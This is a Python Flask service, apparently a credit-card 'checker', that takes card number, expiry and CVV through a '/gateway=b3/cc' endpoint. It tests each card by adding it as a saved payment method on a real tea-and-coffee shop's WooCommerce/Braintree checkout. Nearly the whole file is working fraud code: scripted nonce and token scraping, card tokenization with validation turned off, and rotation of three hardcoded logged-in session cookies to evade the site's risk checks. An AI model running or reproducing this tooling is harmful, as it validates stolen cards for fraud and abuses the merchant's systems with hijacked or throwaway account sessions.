from flask import Flask, jsonify, request
import requests
import json
import time
import uuid
import random
import string
import base64
import re
import threading

app = Flask(__name__)

# Global variables for cookie rotation and rate limiting
current_cookie_index = 0
last_request_time = 0
lock = threading.Lock()

# Define all cookie sets
original_cookies = {
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-10-24%2007%3A53%3A10%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-10-24%2007%3A53%3A10%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'woocommerce_current_currency': 'GBP',
    '_ga': 'GA1.1.1754434682.1761294191',
    'mcforms-38097157-sessionId': '"1ffbebf3-763e-404c-ab5d-33ca3aec32e5"',
    'nitroCachedPage': '0',
    '_fbp': 'fb.1.1761294201465.851852551288875086',
    'mailchimp.cart.current_email': 'zerotracehacked@gmail.com',
    'mailchimp.cart.previous_email': 'zerotracehacked@gmail.com',
    'mailchimp_user_email': 'zerotracehacked%40gmail.com',
    'wordpress_logged_in_ed6aaaf2a4c77ec940184ceefa0c74db': 'zerotracehacked%7C1762503817%7CaPBZvZMKNQ39GNn6YaincgHL96FZPoH69UyIsu5F66y%7Cbe20b116ad3799035f20dbfa310b806ab10c0ea58309c84edbb4bcc42d7d7e4b',
    '_gcl_au': '1.1.1617797498.1761294192.1113548739.1761294203.1761294303',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%206.0%3B%20Nexus%205%20Build%2FMRA58N%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F141.0.0.0%20Mobile%20Safari%2F537.36',
    'sbjs_session': 'pgs%3D12%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method-custom',
    '_ga_81KZY32HGV': 'GS2.1.s1761294191$o1$g1$t1761296133$j51$l0$h1737138817',
    '_ga_0YYGQ7K779': 'GS2.1.s1761294191$o1$g1$t1761296134$j50$l0$h982637675',
}

new_cookies_1 = {
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-10-24%2013%3A56%3A32%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-10-24%2013%3A56%3A32%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F141.0.0.0%20Safari%2F537.36',
    'mcforms-38097157-sessionId': '"20719cf5-c5e7-4134-95bf-a09f07a1f39c"',
    'woocommerce_current_currency': 'GBP',
    'nitroCachedPage': '0',
    '_ga': 'GA1.1.1001458797.1761316064',
    'mailchimp.cart.previous_email': 'rockyog145236@gmail.com',
    '_fbp': 'fb.1.1761316078586.985537515712521112',
    'mailchimp.cart.current_email': 'sexkrogaandmardo@gmail.com',
    'mailchimp_user_previous_email': 'sexkrogaandmardo%40gmail.com',
    'mailchimp_user_email': 'sexkrogaandmardo%40gmail.com',
    'wordpress_logged_in_ed6aaaf2a4c77ec940184ceefa0c74db': 'sexkrogaandmardo%7C1762525696%7CMH8F8OKgoB5RmeM3eucUTuT5Y3kl5ePX2fbH9JwUq9b%7Caa8cb7fba44d6b0442da445520fab7e1b92078993ba77e0f8ec68d4accf66c0a',
    '_gcl_au': '1.1.1021600798.1761316073.1488629449.1761316074.1761316192',
    'sbjs_session': 'pgs%3D13%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fedit-address',
    '_ga_81KZY32HGV': 'GS2.1.s1761316063$o1$g1$t1761316196$j25$l0$h1335384622',
    '_ga_0YYGQ7K779': 'GS2.1.s1761316063$o1$g1$t1761316196$j25$l0$h195413503',
}

new_cookies_2 = {
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-10-24%2013%3A56%3A32%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-10-24%2013%3A56%3A32%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F141.0.0.0%20Safari%2F537.36',
    'mcforms-38097157-sessionId': '"20719cf5-c5e7-4134-95bf-a09f07a1f39c"',
    'woocommerce_current_currency': 'GBP',
    'nitroCachedPage': '0',
    '_ga': 'GA1.1.1001458797.1761316064',
    '_fbp': 'fb.1.1761316078586.985537515712521112',
    'mailchimp.cart.current_email': 'makichutisito@gmail.com',
    'mailchimp_user_previous_email': 'makichutisito%40gmail.com',
    'mailchimp_user_email': 'makichutisito%40gmail.com',
    'mailchimp.cart.previous_email': 'makichutisito@gmail.com',
    'wordpress_logged_in_ed6aaaf2a4c77ec940184ceefa0c74db': 'makichutisito%7C1762525995%7C6hD8aw2RFCRqeWW8So4utlLzEGhrbEIuhfBTN257IGo%7C3ef1070743a359aaf3fa9f3e8f618555c9d9c6ab166413f972bdc85ffe192015',
    '_gcl_au': '1.1.1021600798.1761316073.1488629449.1761316074.1761316446',
    'sbjs_session': 'pgs%3D27%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fedit-address',
    '_ga_81KZY32HGV': 'GS2.1.s1761316063$o1$g1$t1761316449$j37$l0$h1335384622',
    '_ga_0YYGQ7K779': 'GS2.1.s1761316063$o1$g1$t1761316449$j37$l0$h195413503',
}

# List of all cookie sets
cookie_sets = [original_cookies, new_cookies_1, new_cookies_2]

def generate_random_string(length=10):
    """Generate a random string for session IDs"""
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(chars))

def process_payment_flask(ccn, mm, yy, cvc, cookies):
    start_time = time.time()
    
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'priority': 'u=0, i',
        'referer': 'https://www.tea-and-coffee.com/account/add-payment-method-custom',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
    }
    
    try:
        # Get the add payment method page to extract nonces
        page_response = requests.get(
            'https://www.tea-and-coffee.com/account/add-payment-method-custom',
            headers=headers,
            cookies=cookies
        )
        page_response.raise_for_status()
        page_content = page_response.text
        
        # Extract the nonces
        nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', page_content)
        if not nonce_match:
            end_time = time.time()
            time_taken = end_time - start_time
            return {
                "status": "error",
                "response": "Could not find woocommerce-add-payment-method-nonce",
                "time_taken": f"{time_taken:.2f} seconds"
            }
        
        woocommerce_nonce = nonce_match.group(1)
        
        client_nonce_match = re.search(r'client_token_nonce":"([^"]+)"', page_content)
        if not client_nonce_match:
            end_time = time.time()
            time_taken = end_time - start_time
            return {
                "status": "error",
                "response": "Could not find client_token_nonce",
                "time_taken": f"{time_taken:.2f} seconds"
            }
        
        client_nonce = client_nonce_match.group(1)
    except Exception as e:
        end_time = time.time()
        time_taken = end_time - start_time
        return {
            "status": "error",
            "response": f"Error getting page: {str(e)}",
            "time_taken": f"{time_taken:.2f} seconds"
        }
    
    # Step 2: Get client token from admin-ajax.php
    try:
        token_payload = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': client_nonce,
        }
        
        token_response = requests.post(
            'https://www.tea-and-coffee.com/wp-admin/admin-ajax.php',
            headers=headers,
            cookies=cookies,
            data=token_payload
        )
        token_response.raise_for_status()
        token_data = token_response.json()
        
        if not token_data.get('success'):
            end_time = time.time()
            time_taken = end_time - start_time
            return {
                "status": "error",
                "response": f"Failed to get client token: {token_data}",
                "time_taken": f"{time_taken:.2f} seconds"
            }
        
        # Decode the base64 encoded client token
        client_token_encoded = token_data.get('data')
        if not client_token_encoded:
            end_time = time.time()
            time_taken = end_time - start_time
            return {
                "status": "error",
                "response": "No client token in response",
                "time_taken": f"{time_taken:.2f} seconds"
            }
            
        # Decode the token to get the authorization fingerprint
        try:
            client_token_decoded = json.loads(base64.b64decode(client_token_encoded))
            authorization_fingerprint = client_token_decoded.get('authorizationFingerprint')
            merchant_id = client_token_decoded.get('merchantId')
        except Exception as e:
            end_time = time.time()
            time_taken = end_time - start_time
            return {
                "status": "error",
                "response": f"Error decoding client token: {str(e)}",
                "time_taken": f"{time_taken:.2f} seconds"
            }
            
    except Exception as e:
        end_time = time.time()
        time_taken = end_time - start_time
        return {
            "status": "error",
            "response": f"Error getting client token: {str(e)}",
            "time_taken": f"{time_taken:.2f} seconds"
        }
    
    # Step 3: Tokenize credit card
    session_id = str(uuid.uuid4())
    braintree_headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Braintree-Version': '2018-05-10',
        'Authorization': f'Bearer {authorization_fingerprint}'
    }
    
    tokenize_payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": session_id,
        },
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }",
        "variables": {
            "input": {
                "creditCard": {
                    "number": ccn,
                    "expirationMonth": mm,
                    "expirationYear": yy,
                    "cvv": cvc,
                },
                "options": {
                    "validate": False,
                },
            },
        },
    }
    
    try:
        tokenize_response = requests.post(
            'https://payments.braintree-api.com/graphql',
            headers=braintree_headers,
            json=tokenize_payload
        )
        tokenize_response.raise_for_status()
        tokenize_data = tokenize_response.json()
        
        if 'errors' in tokenize_data:
            end_time = time.time()
            time_taken = end_time - start_time
            return {
                "status": "error",
                "response": f"Tokenize error: {tokenize_data['errors']}",
                "time_taken": f"{time_taken:.2f} seconds"
            }
        
        payment_token = tokenize_data['data']['tokenizeCreditCard']['token']
    except Exception as e:
        end_time = time.time()
        time_taken = end_time - start_time
        return {
            "status": "error",
            "response": f"Error tokenizing card: {str(e)}",
            "time_taken": f"{time_taken:.2f} seconds"
        }
    
    # Step 4: Add payment method to tea-and-coffee.com using form data
    form_headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.tea-and-coffee.com',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://www.tea-and-coffee.com/account/add-payment-method-custom',
        'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
    }
    
    # Determine card type based on first digit
    card_type = "visa" if ccn.startswith("4") else "mastercard" if ccn.startswith("5") else "discover"
    
    form_data = {
        'payment_method': 'braintree_credit_card',
        'wc-braintree-credit-card-card-type': card_type,
        'wc-braintree-credit-card-3d-secure-enabled': '',
        'wc-braintree-credit-card-3d-secure-verified': '',
        'wc-braintree-credit-card-3d-secure-order-total': '20.78',
        'wc_braintree_credit_card_payment_nonce': payment_token,
        'wc_braintree_device_data': '',
        'wc-braintree-credit-card-tokenize-payment-method': 'true',
        'woocommerce-add-payment-method-nonce': woocommerce_nonce,
        '_wp_http_referer': '/account/add-payment-method-custom',
        'woocommerce_add_payment_method': '1',
    }
    
    try:
        payment_response = requests.post(
            'https://www.tea-and-coffee.com/account/add-payment-method-custom',
            headers=form_headers,
            cookies=cookies,
            data=form_data
        )
        
        end_time = time.time()
        time_taken = end_time - start_time
        
        # Check for success messages
        response_text = payment_response.text
        
        if 'Nice! New payment method added' in response_text or 'Payment method successfully added.' in response_text:
            return {
                "status": "success",
                "response": "1000: Approved",
                "time_taken": f"{time_taken:.2f} seconds"
            }
        else:
            # Look for error message using the specific pattern
            pattern = r'<ul class="woocommerce-error" role="alert">\s*<li>\s*Status code\s*([^<]+)\s*</li>'
            match = re.search(pattern, response_text)
            
            if match:
                error_message = match.group(1).strip()
                
                # Check for risk threshold
                if 'risk_threshold' in response_text:
                    return {
                        "status": "error",
                        "response": "RISK_BIN: Retry Later",
                        "time_taken": f"{time_taken:.2f} seconds"
                    }
                else:
                    return {
                        "status": "error",
                        "response": error_message,
                        "time_taken": f"{time_taken:.2f} seconds"
                    }
            else:
                # If no specific error message found, return a generic error
                return {
                    "status": "error",
                    "response": "Payment method could not be added",
                    "time_taken": f"{time_taken:.2f} seconds"
                }
    except Exception as e:
        end_time = time.time()
        time_taken = end_time - start_time
        return {
            "status": "error",
            "response": f"Error adding payment method: {str(e)}",
            "time_taken": f"{time_taken:.2f} seconds"
        }

@app.route('/gateway=b3/cc')
def gateway_endpoint():
    global current_cookie_index, last_request_time, lock
    
    # Extract card details from URL parameter
    card_details = request.args.get('card_details')
    if not card_details:
        return jsonify({"error": "Missing card details parameter"}), 400
    
    # Split card details by pipe
    parts = card_details.split('|')
    if len(parts) != 4:
        return jsonify({"error": "Invalid card format. Use: cc|mm|yy|cvv"}), 400
    
    ccn = parts[0]
    mm = parts[1]
    yy = parts[2]
    cvc = parts[3]
    
    # Convert 2-digit year to 4-digit
    if len(yy) == 2:
        yy = '20' + yy
    
    # Check rate limiting
    with lock:
        current_time = time.time()
        time_since_last = current_time - last_request_time
        
        if time_since_last < 10:
            seconds_left = 10 - time_since_last
            return jsonify({
                "status": "wait",
                "response": f"Please wait - {seconds_left:.1f} seconds left"
            })
        
        # Update last request time
        last_request_time = current_time
        
        # Get the current cookie set
        cookies = cookie_sets[current_cookie_index]
        
        # Update cookie index for next request (cycle through 0, 1, 2)
        current_cookie_index = (current_cookie_index + 1) % 3
    
    # Process payment with the selected cookies
    result = process_payment_flask(ccn, mm, yy, cvc, cookies)
    
    return jsonify(result)

if __name__ == '__main__':
    # Initialize last_request_time to avoid immediate rate limiting on startup
    last_request_time = time.time() - 10
    
    # Run the Flask app
    app.run(host='0.0.0.0', port=5000, threaded=False)
